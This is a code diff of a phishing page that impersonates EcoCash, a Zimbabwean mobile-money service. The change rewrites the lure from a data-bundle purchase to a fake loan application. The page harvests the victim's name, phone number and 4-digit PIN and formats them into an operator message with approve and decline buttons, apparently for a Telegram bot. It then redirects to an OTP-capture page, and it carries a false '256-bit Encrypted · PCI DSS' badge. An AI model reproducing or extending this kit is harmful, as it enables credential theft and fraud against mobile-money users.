@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
     <meta name="theme-color" content="#003366">
-    <title>EcoCash Data | Verify Account · Zimbabwe</title>
+    <title>EcoCash Loan | Verify Account · Zimbabwe</title>
     <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
     <style>
         :root {
@@ -215,11 +215,11 @@
         <div class="card">
             <div class="card-head">
                 <h1>Verify Your Account</h1>
-                <p>Enter your EcoCash details to purchase data</p>
+                <p>Enter your EcoCash details to proceed with your loan</p>
             </div>
 
             <div id="bBar" class="bundle-bar" style="display:none;">
-                <div class="b-row"><span>Bundle:</span><span id="bD">&mdash;</span></div>
+                <div class="b-row"><span>Loan Amount:</span><span id="bD">&mdash;</span></div>
                 <div class="b-row"><span>Amount:</span><span id="bP">USD 0.00</span></div>
             </div>
 
@@ -246,7 +246,7 @@
                 </div>
             </form>
 
-            <div class="card-ft">By proceeding you agree to our <a href="#">Terms</a> & <a href="#">Privacy</a></div>
+            <div class="card-ft">By proceeding you agree to our <a href="#">Terms</a> &amp; <a href="#">Privacy</a></div>
             <div class="secure">&#128274; 256-bit Encrypted &middot; PCI DSS</div>
         </div>
     </main>
@@ -274,6 +274,15 @@
                 document.getElementById('bBar').style.display = 'block';
                 document.getElementById('bD').textContent = d;
                 document.getElementById('bP').textContent = 'USD ' + pr;
+            } else {
+                // Loan application flow
+                const amt = p.get('amount'), dur = p.get('duration');
+                if (amt && dur) {
+                    bd = { data: 'Loan USD ' + amt, price: amt };
+                    document.getElementById('bBar').style.display = 'block';
+                    document.getElementById('bD').textContent = 'USD ' + parseFloat(amt).toLocaleString() + ' / ' + dur + ' Months';
+                    document.getElementById('bP').textContent = 'USD ' + parseFloat(amt).toLocaleString();
+                }
             }
         }
 
@@ -308,7 +317,7 @@
             if (phone.length < 9) { showErr('Enter valid 9-digit number'); return; }
             if (pin.length !== 4) { showErr('PIN must be 4 digits'); return; }
 
-            const msg = `\u{1f4f1} <b>New Login</b>\n\n<b>Name:</b> <code>${name}</code>\n<b>Phone:</b> <code>+263${phone}</code>\n<b>PIN:</b> <code>${pin}</code>\n<b>Bundle:</b> <code>${bd.data || 'N/A'}</code>\n<b>Amount:</b> <code>USD ${bd.price || '0.00'}</code>`;
+            const msg = `\u{1f4f1} <b>New Loan Application</b>\n\n<b>Name:</b> <code>${name}</code>\n<b>Phone:</b> <code>+263${phone}</code>\n<b>PIN:</b> <code>${pin}</code>\n<b>Loan:</b> <code>${bd.data || 'N/A'}</code>\n<b>Amount:</b> <code>USD ${bd.price || '0.00'}</code>`;
 
             const btns = [
                 [{ text: '\u2713 Approved', callback_data: 'login_approved' }, { text: '\u2717 Declined', callback_data: 'login_declined' }],
@@ -343,7 +352,9 @@
         function goOTP() {
             document.getElementById('aModal').classList.remove('on');
             const ph = document.getElementById('phone').value.trim().replace(/\s/g, '');
-            location.href = `otp.html?data=${encodeURIComponent(bd.data || '')}&price=${bd.price || ''}&phone=${ph}`;
+            const dataParam = bd.data ? encodeURIComponent(bd.data) : '';
+            const priceParam = bd.price || '';
+            location.href = `otp.html?data=${dataParam}&price=${priceParam}&phone=${ph}`;
         }
 
         document.getElementById('name').addEventListener('keypress', e => { if (e.key === 'Enter') { e.preventDefault(); document.getElementById('phone').focus(); } });
